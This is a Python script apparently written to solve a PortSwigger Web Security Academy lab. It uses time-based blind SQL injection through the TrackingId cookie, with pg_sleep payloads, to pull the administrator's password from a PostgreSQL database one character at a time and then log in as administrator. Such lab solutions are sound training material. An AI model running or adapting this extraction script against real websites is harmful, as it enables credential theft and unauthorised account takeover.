import requests
import string
from urllib3.exceptions import InsecureRequestWarning
from time import sleep
from bs4 import BeautifulSoup

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# lab_url: https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval
# db: PostgreSQL
# author: 0xyf
# using ' AND


class SQLi15:
    def __init__(self):
        self.lab_id = "0a1800a20441372380ec7bdc006400c8"
        self.url = f"https://{self.lab_id}.web-security-academy.net"
        self.login_url = f"{self.url}/login"
        self.proxies = {"https": "http://127.0.0.1:8080"}

        self.sleep = 4
        self.username = "administrator"

    def get_csrf_token(self):
        r = requests.get(f"{self.login_url}")
        soup = BeautifulSoup(r.text, "html.parser")
        self.csrf_token = soup.find("input", attrs={"name": "csrf"})["value"]
        self.cookies = r.cookies

    def execute_request(self, payload):
        cookies = {"TrackingId": payload}
        r = requests.get(self.url, proxies=self.proxies, cookies=cookies, verify=False)
        return r

    def get_pw_len(self):
        for i in range(1000):
            print(f"Finding length of pw {i}")
            payload = f"' AND (SELECT CASE WHEN (LENGTH(password)={i}) THEN pg_sleep({self.sleep}) ELSE null END FROM users WHERE username='administrator') IS NULL AND 'a' = 'a"
            r = self.execute_request(payload)
            if r.elapsed.total_seconds() >= self.sleep:
                print(f"pw length = {i}")
                self.pw_len = i
                return

    def get_pw(self):
        password = ""
        # valid_chars = string.ascii_letters + string.digits
        valid_chars = string.ascii_lowercase + string.digits
        while len(password) != self.pw_len:
            for i in range(1, self.pw_len + 1):
                for char in valid_chars:
                    print(f"building pw: {password}{char}")

                    payload = f"' AND (SELECT CASE WHEN (SUBSTR(password, {i}, 1)='{char}') THEN pg_sleep({self.sleep}) ELSE null END FROM users WHERE username='administrator') IS NULL AND 'a' = 'a"
                    r = self.execute_request(payload)
                    if r.elapsed.total_seconds() >= self.sleep:
                        password += char
                        break

        self.password = password

    def login(self):
        self.get_csrf_token()
        print(f"[*] Attempting to Login as {self.username}:{self.password}")
        data = {
            "username": self.username,
            "password": self.password,
            "csrf": self.csrf_token,
        }
        r = requests.post(
            self.login_url,
            cookies=self.cookies,
            data=data,
            proxies=self.proxies,
            verify=False,
        )
        if r.status_code == 200:
            if "Invalid username or password." not in r.text:
                print(f"[*] valid combination {self.username}:{self.password}")

    def check_solved(self):
        sleep(2)
        r = requests.get(self.url)
        if "Congratulations, you solved the lab!" in r.text:
            print("Lab Solved")
        else:
            print("Did not solve lab, check payload")

    def solve(self):
        self.get_pw_len()
        self.get_pw()
        self.login()
        self.check_solved()


def main():
    SQLi15().solve()


if __name__ == "__main__":
    main()
